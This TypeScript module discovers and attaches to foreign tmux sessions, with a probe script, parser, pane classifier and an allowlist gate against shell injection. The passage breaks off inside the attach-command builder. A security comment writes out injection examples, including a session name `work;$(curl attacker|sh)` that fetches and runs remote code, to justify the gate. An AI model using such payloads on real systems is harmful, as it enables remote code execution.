/**
 * @fileoverview Pure core for FOREIGN tmux sessions, the ones a human started
 * by hand, which Codeman neither created nor owns.
 *
 * Everything here is a string in / structure out, so all three locations (local,
 * inside a container, across ssh) go through ONE probe script, ONE parser and ONE
 * classifier. Writing a second copy per location is exactly how the two would
 * drift into disagreeing about what a session is.
 *
 * ## Why the probe script is dumb
 *
 * It runs two commands and prints them: `tmux list-panes` per socket, and one
 * `ps` snapshot. No filtering, no logic. All judgement happens in Node, where it
 * is pure and unit-testable, instead of in a shell string that is embedded three
 * different ways and can only be debugged against a real host.
 *
 * The one thing the script does decide is whether a server is safe to ask, because
 * only the script can. A tmux server that stopped answering holds its client
 * forever, and from outside a container or across ssh no signal reaches that
 * client: a timeout kills `docker exec` or `ssh`, never what they started. So each
 * server gets a bounded ping first, and one that misses it costs its own rows and
 * a `CMFH` line, not the whole scan.
 *
 * ⚠️ The ping exists because a watchdog around `list-panes` cannot work. A tmux
 * client hands dups of its stdout to the server, so a stopped server keeps our
 * stdout pipe open after the client is dead (measured: SIGTERM ended the client at
 * once and no EOF came in the 2.5 s that were watched, while the server stayed
 * stopped). Nothing reading that pipe can finish, and the same hold would keep
 * `docker exec` and `ssh` waiting on it. The ping's stdout is /dev/null, so only a
 * server that just answered ever gets the real one.
 *
 * ⚠️ The script MUST NOT contain a single quote. It is wrapped in single quotes
 * to cross `ssh <host> '<script>'` and `docker exec <c> sh -lc '<script>'`. That
 * is the single-quote dual of the "no double quotes in the docker launch chain"
 * rule in `tmux-manager.ts`: same class of bug, opposite quote.
 *
 * ## Why the mode comes from the process tree
 *
 * `#{pane_current_command}` is `node` for BOTH claude and codex, so it cannot
 * distinguish them. The classifier walks the pane's descendants over the `ps`
 * snapshot with `collectDescendants` (bounded: one snapshot, no per-node spawn,
 * see proc-tree.ts for the incident that rule exists for) and matches argv. What
 * it cannot identify is `shell`, which is also the honest answer for the case
 * this feature was built for: a hand-opened shell.
 *
 * ## Why attaching means creating a grouped session
 *
 * A grouped session (`new-session -t <target>`) shares the target's WINDOWS but
 * is its own session, so our `status off` and our current-window selection land
 * on us alone. A bare `attach` would have to set those on the owner's session,
 * i.e. mutate something we do not own. `destroy-unattached on` then makes our
 * view evaporate when the wrapper pane dies (measured: it does).
 *
 * ⚠️ The group session must be created ATTACHED (no `-d`). tmux's
 * `server_check_unattached()` runs every server loop, so a detached session with
 * `destroy-unattached on` is torn down almost immediately: the option has to
 * land on a session that already has our client on it.
 *
 * ⚠️ **Grouping does NOT give us an independent window SIZE, and believing it did
 * was wrong.** Measured on tmux 3.3a against a target held open by a 200x49
 * client, with our client at 80x24:
 *
 *   bare attach                      -> target becomes 80x23
 *   grouped session                  -> target becomes 80x23   (same!)
 *   grouped + `window-size largest`  -> target stays  200x49
 *
 * A window is one object with one size; a group shares the object. So attaching
 * from Codeman resizes a session someone else is actively viewing, exactly like
 * any second tmux client does: that is tmux's normal behavior, and it reverses
 * when we detach.
 *
 * `window-size largest` is deliberately NOT set here. It is a WINDOW option on a
 * SHARED window, so it survives our detach (measured: still `largest` after our
 * view is gone): it would permanently rewrite the owner's configuration to buy
 * a cropped view for us. Restoring it would need the previous value captured with
 * `$(...)`, and this string carries no command substitution. It reaches `bash -c`
 * verbatim now (`bashCArg()`), but it crossed `bash -c "..."` for a long time, where
 * the OUTER shell expanded it first. That is the same rule the docker launch chain
 * states as "no command substitution", and the same trap that silently emptied
 * `$TMUX_TMPDIR` while this probe was developed.
 * A user who wants the crop instead of the resize can set `window-size largest`
 * on their own session, which is theirs to set.
 *
 * @module foreign-tmux
 */

import { collectDescendants } from './proc-tree.js';
import { listClis } from './config/cli-registry/registry.js';
import { withRemoteTmuxPath } from './remote-hosts.js';
import {
  FOREIGN_MAX_ARGV_CHARS,
  FOREIGN_MAX_PANES,
  FOREIGN_MAX_PROCS,
  FOREIGN_SOCKET_TIMEOUT_SECONDS,
} from './config/foreign-tmux.js';
import type { ForeignPaneProbe, ForeignTmuxLocationKind } from './types/foreign-tmux.js';
import type { SessionAdopt, SessionMode } from './types/session.js';

// ===========================================================================
// Probe script
// ===========================================================================

/**
 * Field separator. tmux's `-F` does NOT expand a backslash-t escape: it emits the
 * LITERAL two characters (verified on next-3.7, the same finding that shaped
 * `parseRemoteSessionList` in remote-hosts.ts). The parser accepts a real TAB too,
 * in case some build does expand it.
 */
const SEP = '\\t';
const SEP_SPLIT = /\\t|\t/;
const REJOIN = '\t';

const PANE_MARKER = 'CMFP';
const PROC_MARKER = 'CMFQ';
const SOCKET_MARKER = 'CMFS';
const HUNG_MARKER = 'CMFH';

/**
 * The probe, as POSIX sh. NO SINGLE QUOTES (see @fileoverview).
 *
 * Emits, in order:
 *   CMFS<sep><socket path>                        (one per readable socket)
 *   CMFP<sep><socket><sep>...<sep>name<sep>path   (one per pane on that socket)
 *   CMFH<sep><socket path>                        (a server that did not answer)
 *   CMFQ                                          (marker; ps rows follow)
 *   <pid> <ppid> <argv...>
 *
 * The two free-form fields (session name, pane path) are LAST so a separator
 * inside one of them can be re-joined by position instead of corrupting the row.
 */
export function buildForeignProbeScript(): string {
  const fmt = [
    PANE_MARKER,
    '#{socket_path}',
    '#{pane_pid}',
    '#{window_index}',
    '#{session_windows}',
    '#{session_created}',
    '#{session_attached}',
    '#{pane_id}',
    '#{pane_current_command}',
    '#{session_name}',
    '#{pane_current_path}',
  ].join(SEP);

  // `ps -eo` covers procps and macOS; `ps ax -o` is the BSD-ish fallback. If both
  // fail we still emit the pane rows, and classification degrades to the pane
  // command, which still names a plain shell correctly.
  // ⚠️ No `set -f` here: the socket sweep IS a glob, and disabling pathname
  // expansion turns the loop into a single literal non-match. ⚠️ The marker line
  // must NOT try to carry the field separator at all. Measured: `sh`'s builtin
  // `echo` EXPANDS a backslash-t to a real TAB, while tmux's own `-F` emits the
  // two literal characters, so the same escape means two different things two
  // lines apart. The socket line is space-separated instead (marker first, rest
  // of line is the path), which no shell rewrites.
  //
  // Only `$TMUX_TMPDIR/tmux-<uid>/` is swept, which covers every `tmux -L <name>`
  // server (that is exactly where tmux puts them). A socket at an arbitrary
  // `tmux -S /custom/path` is deliberately out of scope: finding it would mean
  // walking the filesystem for sockets.
  //
  // `-u` because a POSIX locale otherwise rewrites every non-ASCII byte tmux prints
  // to `_` (measured in a container: session `会话` listed as `____`), and a name
  // read wrong is a name the guard then cannot find.
  //
  // The ping (see @fileoverview) runs in the background beside a watchdog, the POSIX
  // spelling of `timeout`, which macOS does not ship. A stale socket answers at once
  // with status 1 and is skipped, so the ping costs a live server one extra spawn and
  // a dead one none. `has-session` cannot start a server on a stale socket.
  // ⚠️ The watchdog says it fired with its own exit status, 7: a tmux client ended by
  // SIGTERM exits 0 (measured), so the ping's status cannot tell. It prints the marker
  // BEFORE the kill and the loop reaps it, or the line could land after `CMFQ` and
  // parse as a process row. The `trap` ends the `sleep` with it, so a scan does not
  // leave one behind per socket. `\$Z` is for the trap to expand: it is set before Z
  // exists, so a socket that answers at once wins that race.
  const watchdog =
    `( trap "kill \\$Z 2>/dev/null; exit" TERM; sleep ${FOREIGN_SOCKET_TIMEOUT_SECONDS} >/dev/null 2>&1 & Z=$!; ` +
    `wait $Z && { echo "${HUNG_MARKER} $S"; kill $P; exit 7; } ) & W=$!`;
  const ping =
    `tmux -S "$S" has-session >/dev/null 2>&1 & P=$!; ${watchdog}; ` +
    'wait $P; R=$?; kill $W 2>/dev/null; wait $W 2>/dev/null; [ $? -ne 7 ] && [ $R -eq 0 ] || continue';
  return [
    'TD=${TMUX_TMPDIR:-/tmp}',
    'U=$(id -u 2>/dev/null || echo 0)',
    `for S in $TD/tmux-$U/*; do [ -S "$S" ] || continue; echo "${SOCKET_MARKER} $S"; ${ping}; ` +
      `tmux -u -S "$S" list-panes -a -F "${fmt}" 2>/dev/null; done`,
    `echo ${PROC_MARKER}`,
    'ps -eo pid=,ppid=,args= 2>/dev/null || ps ax -o pid=,ppid=,args= 2>/dev/null || true',
  ].join('; ');
}

// ===========================================================================
// Parsing
// ===========================================================================

export interface ForeignProbeOutput {
  panes: ForeignPaneProbe[];
  /** parent pid to child pids, from the ONE `ps` snapshot (proc-tree input). */
  byParent: Map<number, number[]>;
  /** pid to full argv line. */
  argvByPid: Map<number, string>;
  /** Sockets seen, in scan order (may exceed the pane list when a socket is empty). */
  sockets: string[];
  /** Sockets whose server missed the per-socket bound, so their rows are absent. */
  hungSockets: string[];
}

/**
 * Parse one probe's stdout. Never throws: a malformed row is skipped, not fatal.
 *
 * ⚠️ Runs synchronously on the server's event loop over text a process in a pane, a
 * container or an ssh host wrote, so nothing here may cost more than linear time in it:
 * the row caps do not help when one row is the whole 2 MiB.
 */
export function parseForeignProbeOutput(stdout: string): ForeignProbeOutput {
  const panes: ForeignPaneProbe[] = [];
  const sockets = new Set<string>();
  const hungSockets: string[] = [];
  const byParent = new Map<number, number[]>();
  const argvByPid = new Map<number, string>();
  if (!stdout) return { panes, byParent, argvByPid, sockets: [], hungSockets };

  let inProcs = false;
  let procCount = 0;

  for (const raw of stdout.split('\n')) {
    const line = raw.replace(/\r$/, '');
    if (!line) continue;

    if (!inProcs && line === PROC_MARKER) {
      inProcs = true;
      continue;
    }

    if (inProcs) {
      if (procCount >= FOREIGN_MAX_PROCS) continue;
      // `<pid> <ppid> <argv...>`: leading spaces are how `ps -o pid=` pads.
      // ⚠️ `s`, so `.*$` cannot fail: without it a bare CR in an argv stopped the `.`, and
      // `\s+` handed its spaces back one at a time, quadratic in a row this long.
      const m = /^\s*(\d+)\s+(\d+)\s+(.*)$/s.exec(line);
      if (!m) continue;
      const pid = Number(m[1]);
      const ppid = Number(m[2]);
      if (!Number.isSafeInteger(pid) || !Number.isSafeInteger(ppid)) continue;
      procCount += 1;
      argvByPid.set(pid, (m[3] ?? '').slice(0, FOREIGN_MAX_ARGV_CHARS));
      const siblings = byParent.get(ppid);
      if (siblings) siblings.push(pid);
      else byParent.set(ppid, [pid]);
      continue;
    }

    if (line.startsWith(`${SOCKET_MARKER} `)) {
      const sock = line.slice(SOCKET_MARKER.length + 1);
      if (sock) sockets.add(sock);
      continue;
    }

    if (line.startsWith(`${HUNG_MARKER} `)) {
      hungSockets.push(line.slice(HUNG_MARKER.length + 1));
      continue;
    }

    const fields = line.split(SEP_SPLIT);
    if (fields[0] !== PANE_MARKER) continue;
    if (panes.length >= FOREIGN_MAX_PANES) continue;
    // 11 fields: marker + 8 fixed + name + path. A separator inside the NAME
    // pushes extras into the middle, so the path is taken from the END and the
    // name is whatever sits between the fixed prefix and it.
    if (fields.length < 11) continue;

    const panePid = Number(fields[2]);
    const windowIndex = Number(fields[3]);
    const windows = Number(fields[4]);
    const created = Number(fields[5]);
    if (!Number.isSafeInteger(panePid) || panePid <= 0) continue;

    const paneCurrentPath = fields[fields.length - 1] ?? '';
    const sessionName = fields.slice(9, fields.length - 1).join(REJOIN);
    if (!sessionName) continue;

    panes.push({
      socketPath: fields[1] ?? '',
      sessionName,
      windowIndex: Number.isSafeInteger(windowIndex) ? windowIndex : 0,
      paneId: fields[7] ?? '',
      panePid,
      paneCurrentCommand: (fields[8] ?? '').slice(0, FOREIGN_MAX_ARGV_CHARS),
      paneCurrentPath,
      sessionAttached: fields[6] === '1',
      sessionCreated: Number.isSafeInteger(created) && created > 0 ? created : 0,
      windows: Number.isSafeInteger(windows) && windows > 0 ? windows : 1,
    });
  }

  return { panes, byParent, argvByPid, sockets: [...sockets], hungSockets };
}

// ===========================================================================
// Classification
// ===========================================================================

/**
 * argv signatures, derived from the registry rather than written here.
 *
 * Matched against the WHOLE argv of a pane descendant, so `node .../bin/claude`
 * hits the claude rule via the path. The binary names come from each entry's
 * `discovery.binaries`, the one place that already knows a mode name is NOT
 * always a binary name (`antigravity` runs `agy`). The hand-written table this
 * replaces keyed on CLI ids, which CLAUDE.md forbids outside `stock.ts`, and it
 * had already fallen behind: `omp` was missing, so a hand-started omp pane read
 * as a plain shell.
 *
 * Resolved at CALL time, never into a module-level const: a CLI enabled (or a
 * custom entry added) at runtime must be recognised without a restart.
 *
 * ⚠️ Longest name first. `pi` is two characters and its "command itself" form
 * would otherwise be tried before `opencode`'s; length order is what keeps a
 * short generic name from claiming a pane that belongs to a longer one.
 *
 * ⚠️ Names are regex-ESCAPED. They reach here from `~/.codeman/clis.json`, and
 * while the schema's SHELL_TOKEN already refuses the dangerous shapes, building
 * a pattern out of an unescaped foreign string is how a config value turns into
 * a regex. Escaping means the worst a bad name can do is match nothing.
 *
 * ⚠️ Keep these free of unbounded tails, since each one runs over someone else's argv on
 * the event loop. The node launcher shape needs one, so it lives in `launcherPrefixes()`
 * and `launcherDir` only has to name the directory.
 */
export function foreignCliSignatures(): ReadonlyArray<{ mode: SessionMode; test: RegExp; launcherDir: RegExp }> {
  const seen = new Set<string>();
  const out: { mode: SessionMode; test: RegExp; launcherDir: RegExp }[] = [];
  // `listClis()`, not `enabledClis()`: classification is a description of what is
  // ALREADY running in someone else's pane, not a decision to launch anything.
  // A disabled CLI still deserves its real name on the row.
  const named: { mode: SessionMode; name: string }[] = [];
  for (const entry of listClis()) {
    // ⚠️ Stock entries only, and this is a `stock` check rather than an id check
    // on purpose: `SessionMode` is the CLOSED union of the stock ids, so a custom
    // entry has no SessionMode to be. Letting one through would put a value the
    // union does not contain on `SessionState.mode`. A custom CLI's pane falls to
    // the `shell` answer below, which is the honest one: Codeman has no name for
    // it, and an adopted wrapper runs `attach` either way.
    if (!entry.stock) continue;
    for (const binary of entry.discovery.binaries) {
      // `shell` declares none, which is right: it is the FALLBACK answer, never a
      // signature match.
      if (!binary || seen.has(binary)) continue;
      seen.add(binary);
      named.push({ mode: entry.id as SessionMode, name: binary });
    }
  }
  named.sort((a, b) => b.name.length - a.name.length);
  for (const { mode, name } of named) {
    const n = escapeRegExp(name);
    out.push({
      mode,
      // the command itself · a `bin/` path
      test: new RegExp(`(^|[/\\\\])${n}(\\s|$)|[/\\\\]bin[/\\\\]${n}\\b`),
      // a node launcher under the CLI's own dot-directory (`~/.claude/local/.../cli.js`)
      launcherDir: new RegExp(`[/\\\\]\\.?${n}[/\\\\]`),
    });
  }
  return out;
}

function escapeRegExp(value: string): string {
  return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** Commands that mean "this is a plain shell", not an unidentified agent. */
const SHELL_COMMANDS = new Set([
  'bash',
  'sh',
  'zsh',
  'fish',
  'dash',
  'ksh',
  'tcsh',
  'csh',
  'ash',
  'busybox',
  'login',
  '-bash',
  '-zsh',
  '-sh',
]);

export interface ClassifiedPane {
  mode: SessionMode;
  /** The argv line the decision came from, truncated for display. */
  command: string;
}

const COMMAND_DISPLAY_MAX = 160;

/**
 * Decide what a pane is running.
 *
 * Order matters: the pane's own command is checked against the CLI signatures
 * first (a pane running `claude` directly is unambiguous and needs no walk), then
 * the bounded descendant walk, and only then the shell fallback. The walk is what
 * separates claude from codex, since tmux reports `node` for both.
 */
export function classifyForeignPaneMode(
  pane: Pick<ForeignPaneProbe, 'panePid' | 'paneCurrentCommand'>,
  probe: Pick<ForeignProbeOutput, 'byParent' | 'argvByPid'>,
  match: ForeignSignatureMatcher = createForeignSignatureMatcher()
): ClassifiedPane {
  const own = probe.argvByPid.get(pane.panePid) ?? pane.paneCurrentCommand;

  const direct = match(own);
  if (direct) return { mode: direct, command: truncate(own) };

  // ⚠️ Report truncation. A walk that stopped at a cap returns "nothing matched",
  // which is byte-identical to the answer for a real shell: without this line a
  // deep or wide tree silently downgrades an agent pane to `shell` and there is
  // nothing anywhere to tell the two apart.
  const descendants = collectDescendants(pane.panePid, probe.byParent, {
    onTruncated: (root, cap, reason) =>
      console.warn(`[foreign-tmux] descendant walk for ${root} hit the ${cap}-${reason} cap; truncating`),
  });
  for (const pid of descendants) {
    const argv = probe.argvByPid.get(pid);
    if (!argv) continue;
    const hit = match(argv);
    if (hit) return { mode: hit, command: truncate(argv) };
  }

  // tmux's own answer is the last signal worth trying: `#{pane_current_command}`
  // is the pane's FOREGROUND process, whereas `pane_pid` is the shell hosting it,
  // so this catches an agent whose process tree was unreadable (no `ps` on the
  // host) or deeper than the walk's cap.
  const fromTmux = match(pane.paneCurrentCommand);
  if (fromTmux) return { mode: fromTmux, command: truncate(pane.paneCurrentCommand) };

  // Nothing recognised. `shell` is the honest answer AND the primary case this
  // feature exists for; the raw command travels alongside so the UI can show what
  // is actually running rather than asserting a mode it did not verify.
  return { mode: 'shell', command: truncate(own || pane.paneCurrentCommand) };
}

export type ForeignSignatureMatcher = (argv: string) => SessionMode | null;

/**
 * One scan's answer to "which CLI is this argv?".
 *
 * ⚠️ Scoped to a scan, because this is the cost no row cap bounds. A pane's walk reads up
 * to PROC_WALK_MAX_NODES rows and every pane of a hostile host can claim the same tree, so
 * the walks repeat one set of rows FOREIGN_MAX_PANES times. Building the regexes once and
 * asking about each distinct argv once ties the work to the bytes the probe really carried.
 */
export function createForeignSignatureMatcher(): ForeignSignatureMatcher {
  const signatures = foreignCliSignatures();
  const answers = new Map<string, SessionMode | null>();
  return (argv) => {
    let answer = answers.get(argv);
    if (answer === undefined) {
      answer = matchSignature(argv, signatures);
      answers.set(argv, answer);
    }
    return answer;
  };
}

function matchSignature(argv: string, signatures: ReturnType<typeof foreignCliSignatures>): SessionMode | null {
  if (!argv) return null;
  const base = basenameOf(argv);
  if (SHELL_COMMANDS.has(base)) return null;
  const launchers = launcherPrefixes(argv);
  for (const sig of signatures) {
    if (sig.test.test(argv) || launchers.some((prefix) => sig.launcherDir.test(prefix))) return sig.mode;
  }
  return null;
}

/**
 * What comes before the last `cli.js` of each word, which is where a CLI's own directory
 * has to be for that word to be its node launcher.
 *
 * ⚠️ A scan rather than a `[^\s]*cli\.js` tail on the signature. That tail was retried from
 * every `/pi/` in an argv, which is quadratic in someone else's text: 4.6 s of event loop
 * for a 128 KiB argv. A bounded tail only shrinks the constant, and a scan pays it per row.
 */
function launcherPrefixes(argv: string): string[] {
  const prefixes: string[] = [];
  for (const word of argv.split(/\s+/)) {
    const end = word.lastIndexOf('cli.js');
    if (end > 0) prefixes.push(word.slice(0, end));
  }
  return prefixes;
}

function basenameOf(argv: string): string {
  const first = argv.trim().split(/\s+/)[0] ?? '';
  const slash = first.lastIndexOf('/');
  return slash >= 0 ? first.slice(slash + 1) : first;
}

function truncate(s: string): string {
  const flat = s.replace(/\s+/g, ' ').trim();
  return flat.length > COMMAND_DISPLAY_MAX ? `${flat.slice(0, COMMAND_DISPLAY_MAX - 1)}...` : flat;
}

// ===========================================================================
// Exclusion: never adopt what Codeman already owns
// ===========================================================================

/** tmux servers Codeman runs itself. Sessions on these are never "foreign". */
const CODEMAN_SOCKET_BASENAMES = new Set(['codeman', 'codeman-remote', 'codeman-docker']);

/** Session names Codeman mints. */
const CODEMAN_SESSION_PREFIXES = ['codeman-', 'claudeman-'];

/**
 * Is this pane one of Codeman's own, at any location?
 *
 * Excluding them is not cosmetic. Locally it stops Codeman from adopting its own
 * sessions (which would attach a second PTY to a live pane). On a remote host or
 * inside a container it stops the SAME session from being reachable through two
 * different code paths: `remote-hosts.listRemoteCodemanSessions` already owns
 * the `tmux -L codeman` case there, and two paths to one session is how the two
 * end up disagreeing about ownership.
 *
 * @param ownSocket this instance's own socket name (`resolveTmuxSocketName()`),
 *                  which is instance-scoped and therefore not a constant.
 */
export function isCodemanOwnedPane(
  pane: Pick<ForeignPaneProbe, 'socketPath' | 'sessionName'>,
  ownSocket: string
): boolean {
  const socketName = basenameOf(pane.socketPath);
  if (socketName === ownSocket) return true;
  if (CODEMAN_SOCKET_BASENAMES.has(socketName)) return true;
  // A `codeman-<instance>` socket belongs to another Codeman instance even when
  // THIS instance runs on a different one.
  if (socketName.startsWith('codeman-')) return true;
  return CODEMAN_SESSION_PREFIXES.some((p) => pane.sessionName.startsWith(p));
}

// ===========================================================================
// Adoptability: what may cross the launch chain at all
// ===========================================================================

/**
 * Characters a foreign session name or socket path may contain to be adoptable.
 *
 * ⚠️ This is a SECURITY GATE, not tidiness, and it is an ALLOWLIST because the
 * blocklist version of it is one forgotten character away from a shell.
 *
 * A foreign session name is chosen by SOMEONE ELSE, and it would cross several
 * shells on the way to tmux: the local `sh` and `bash -c` at `respawn-pane`, then
 * `sh -lc` in a container, or the login shell and `sh -c` over ssh. The launch reaches
 * `bash -c` single-quoted now (`bashCArg()`), which closes the first of those, and the
 * gate stays as defense in depth for the rest. It was written against the double-quoted
 * form, `execSync(`… bash -c ${JSON.stringify(launchCmd)}`)`, and that is the shape of
 * the mistake it stops. `JSON.stringify` escapes `"` and `\` (it does NOT escape `$` or
 * a backtick) and the outer shell parses that string with those still live inside its
 * double quotes. The inner single quotes this module adds do not help: the outer shell
 * substitutes first. Measured directly:
 *
 *   launchCmd = `: 'x$(touch /tmp/PWNED2)`touch /tmp/PWNED3`'`
 *   execSync(`bash -c ${JSON.stringify(launchCmd)}`)  ->  BOTH files created
 *
 * So a session called `work;$(curl attacker|sh)` sitting on the default socket
 * would run as the Codeman server account the moment someone clicked Open. The
 * name never reaches a command at all now: a candidate that fails this test is
 * dropped during discovery, so it has no id, and the adopt endpoint re-resolves
 * through that same discovery and can only 404.
 *
 * Generous on purpose about what real names contain (Unicode letters, digits,
 * marks, spaces, and the punctuation people actually use), because a refusal
 * here is a session the user cannot open at all.
 */
const ADOPTABLE_TEXT = /^[\p{L}\p{N}\p{M} _.+=@#%,~^!/-]+$/u;

/**
 * Names `new-session -t` reads as target syntax instead of as a name.
 *
 * ⚠️ The guard's `has-session -t '=<name>'` looks up by name, the join does not, so
 * these pass the guard and then join something else. Measured on tmux 3.4: `@1` and
 * `%1` joined the session holding that window or pane, and input typed in the tab
 * reached it; `=eq`, `@zz`, `%zz`, `~` and a bare `=` made a new group with a fresh
 * shell on the foreign server. `~foo` and `! + - ^` joined their own windows, so a
 * plain first-character rule would refuse them for nothing.
 */
const TMUX_TARGET_SYNTAX = /^[=@%]|^~$/;

/** Same rule, plus the path separator and no `..` climbing. */
export function isAdoptableSocketPath(socketPath: string): boolean {
  if (!socketPath || socketPath.length > 4096) return false;
  if (!socketPath.startsWith('/')) return false;
  if (socketPath.includes('..')) return false;
  return ADOPTABLE_TEXT.test(socketPath);
}

/** True when this session name can cross the launch chain safely. */
export function isAdoptableSessionName(sessionName: string): boolean {
  if (!sessionName || sessionName.length > 256) return false;
  if (TMUX_TARGET_SYNTAX.test(sessionName)) return false;
  return ADOPTABLE_TEXT.test(sessionName);
}

// ===========================================================================
// Identity
// ===========================================================================

/**
 * Stable, opaque id for a candidate. The browser sends this back to adopt, so it
 * must survive a re-scan (same session gets the same id) without the browser ever
 * handing us a socket path or session name to interpolate into a command.
 */
export function foreignSessionId(
  location: ForeignTmuxLocationKind,
  hostKey: string,
  socketPath: string,
  sessionName: string
): string {
  return `f${fnv1a(`${location} ${hostKey} ${socketPath} ${sessionName}`)}`;
}

/**
 * What names one foreign tmux session across every location Codeman can reach.
 * A socket path and a session name are not enough on their own: a socket path is
 * only meaningful INSIDE its location. Containers commonly run tmux as root
 * (`/tmp/tmux-0/default`) with default names `0`, `1`, so session `0` in two
 * containers is the same pair, and so is the same name on this machine and on an
 * ssh host with the same uid.
 *
 * A `ForeignTmuxSession` candidate is one of these as it stands. A wrapper's
 * `SessionAdopt` is turned into one by `adoptTargetIdentity()`.
 */
export interface ForeignTargetIdentity {
  location: ForeignTmuxLocationKind;
  /** Registry id of the docker or remote host. Absent for local. */
  hostId?: string;
  /** The container (`location === 'docker'`), which is only unique per engine, hence beside `hostId`. */
  containerName?: string;
  socketPath: string;
  sessionName: string;
}

/**
 * The ONE key that decides "is this foreign session already wrapped?". The adopt
 * route's one-wrapper-per-target check and the listing's `adoptedBy` both read it;
 * two keys are how a row ends up offering a tab that belongs to another location.
 *
 * Unlike `foreignSessionId` this is not opaque, and it stays on the server: the
 * opaque id encodes a discovery detail a restored wrapper does not carry, while
 * everything here is on `SessionAdopt` too.
 */
export function foreignTargetKey(target: ForeignTargetIdentity): string {
  // \u0000 as an ESCAPE: see the note in candidatesFrom() about NUL bytes in source.
  return [target.location, target.hostId ?? '', target.containerName ?? '', target.socketPath, target.sessionName].join(
    '\u0000'
  );
}

/** A wrapper's adoption record, as the identity of the foreign session it wraps. */
export function adoptTargetIdentity(adopt: SessionAdopt): ForeignTargetIdentity {
  return {
    location: adopt.location,
    hostId: adopt.docker?.hostId ?? adopt.remote?.hostId,
    containerName: adopt.docker?.containerName,
    socketPath: adopt.socketPath,
    sessionName: adopt.targetSession,
  };
}

function fnv1a(input: string): string {
  let h = 0x811c9dc5;
  for (let i = 0; i < input.length; i += 1) {
    h ^= input.charCodeAt(i);
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h.toString(16).padStart(8, '0');
}

/**
 * Our grouped view session's name on the FOREIGN server. Deliberately prefixed
 * `codeman-view-` so a human looking at their own `tmux ls` can see what joined
 * them, and so a second Codeman's discovery excludes it (the `codeman-` prefix
 * rule above).
 */
export function foreignViewSessionName(sessionId: string): string {
  return `codeman-view-${sessionId.slice(0, 8)}`;
}

// ===========================================================================
// Attach command builders
// ===========================================================================

/** Single-quote for POSIX sh. Local copy so this module stays dependency-free. */
export function fshq(str: string): string {
  return `'${String(str).replace(/'/g, `'\\''`)}'`;
}

export interface ForeignAttachTarget {
  socketPath: string;
  targetSession: string;
  viewSession: string;
}

/**
 * The tmux invocation that joins a foreign session, as ONE line of POSIX sh.
 *
 * Shape and why:
 *   command -v tmux || { echo no tmux; exit 127; } ;
 *   tmux -S <sock> has-session -t '=<target>' || { echo gone; exit 1; } ;
 *   tmux -S <sock> kill-session -t '=<view>' 2>/dev/null ;
 *   exec tmux -u -S <sock> new-session -t <target> -s <view> ; set destroy-unattached on ; set status off
 *
 * - ⚠️ `command -v` first because the guard below fires on ANY failure, and "tmux is
 *   not on this PATH" (exit 127, hidden by the `2>/dev/null`) must not be told to the
 *   user as "your session is gone" while it is running.
 * - `-u` on the client: in a POSIX locale it otherwise writes the tab as if the
 *   terminal were ASCII (measured: `_ hello qqq ____` for `❯ hello ─── 你好`). Only
 *   the join needs it, since the guard prints nothing and tmux compares a target
 *   name as bytes in any locale.
 * - ⚠️ The `has-session` guard comes FIRST because `new-session -t` does not fail
 *   on a missing target, it invents one. Measured on tmux 3.4: with `work` gone it
 *   joined `work-prod`, with nothing matching it created a fresh shell, and on a
 *   socket with no server it STARTED one. This line re-runs every time the wrapper
 *   pane is respawned, and boot recovery does that for every dead pane, so once the
 *   owner exits their session the next Codeman restart would leave a new shell on
 *   their machine, in their container or on their ssh host. `=` is what makes the
 *   check exact (no prefix match), and `2>/dev/null` keeps tmux's own "no server"
 *   noise out of the pane: the message we print says it better. The check only holds
 *   for a name `new-session -t` also reads as a name, which is what
 *   `isAdoptableSessionName` keeps true (see `TMUX_TARGET_SYNTAX`).
 * - ⚠️ The `=` prefix cannot stand in for that check on `new-session -t`: with the
 *   target gone tmux takes it as part of the name and creates a group literally
 *   called `=work`. It has to be a separate `has-session`.
 * - `new-session -t` creates a session in the target's GROUP: same windows, our
 *   own session options and current window (NOT our own size, see @fileoverview
 *   for the measurement that disproved that).
 * - `status off` is why grouping earns its keep: it lands on OUR session, so the
 *   owner's status bar is untouched.
 * - No `-d`: the session must be attached before `destroy-unattached` lands on it.
 * - The escaped semicolons reach tmux as plain command separators after one shell
 *   parse, the same convention the docker launch chain uses.
 * - ⚠️ There is NO degraded fallback, on purpose. A read-only `attach-session -r`
 *   used to hang off `||` "for a tmux too old to group", but `||` fires on ANY
 *   `new-session` failure. The one that actually happens is a leftover view with
 *   the same name (the in-container leak described above): measured, `new-session`
 *   answers `duplicate session: codeman-view-…` and the fallback then handed the
 *   user a read-only client showing the owner's status bar, where everything typed
 *   is dropped while the API reports success. That is the worst shape a failure can
 *   take here. So: clear OUR OWN stale view first, then either group successfully
 *   or exit with a message.
 * - The `kill-session` is safe by construction and cannot touch the human's work:
 *   the name is `codeman-view-<our own session id>`, `=` makes the match exact, and
 *   killing a session in a group removes only that session (measured: the owner's
 *   `work` survived its grouped view being killed). `2>/dev/null` because "no such
 *   session" is the normal case, not an error.
 * - ⚠️ Nothing here touches the prefix table, unlike the nested servers Codeman runs
 *   itself (`nestedPrefixTableResetCommands`). Our own socket already has its table
 *   reduced by `createSession`, but key tables are SERVER-WIDE, so reducing the foreign
 *   one would rewrite the owner's keys for every session on their server, and it would
 *   outlive our detach. Same reason `window-size` is left alone above. The owner's
 *   bindings stay reachable from a tab, behind our own `send-prefix`, as theirs to use.
 * - ⚠️ While the view exists the window has two sessions holding it, so an owner's
 *   `kill-session` on their own session leaves the window alive under the view
 *   (measured on tmux 3.4: `tmux ls` then shows only `codeman-view-…`, the shell keeps
 *   running) until the tab closes and `destroy-unattached` lets go of it. Exiting the
 *   shell inside the pane ends it at once, view and all. Nothing here can tell the two
 *   apart without a hook on the owner's server, which is not ours to install.
 * - Single line: nothing here needs a second one. A real newline would survive
 *   `bash -c` now (`bashCArg()`), though not the JSON escaping this line crossed before.
 */
export function buildForeignTmuxInvocation(target: ForeignAttachTarget): string {
  const sock = fshq(target.socketPath);
  const t = fshq(target.targetSession);
  // `=name` is tmux's exact-match form. Only for the two commands that LOOK UP a
  // session; never for `new-session -t`, which would name the group `=name`.
  const exact = fshq(`=${target.targetSession}`);
  const v = fshq(target.viewSession);
  const gone = fshq(
    `Codeman: session ${target.targetSession} is gone. Codeman never creates a session it does not own.`
  );
  const noTmux = fshq('Codeman: tmux was not found here, so the session could not be opened. It may still be running.');
  const tmuxCheck = `command -v tmux >/dev/null 2>&1 || { echo ${noTmux}; exit 127; }`;
  const guard = `tmux -S ${sock} has-session -t ${exact} 2>/dev/null || { echo ${gone}; exit 1; }`;
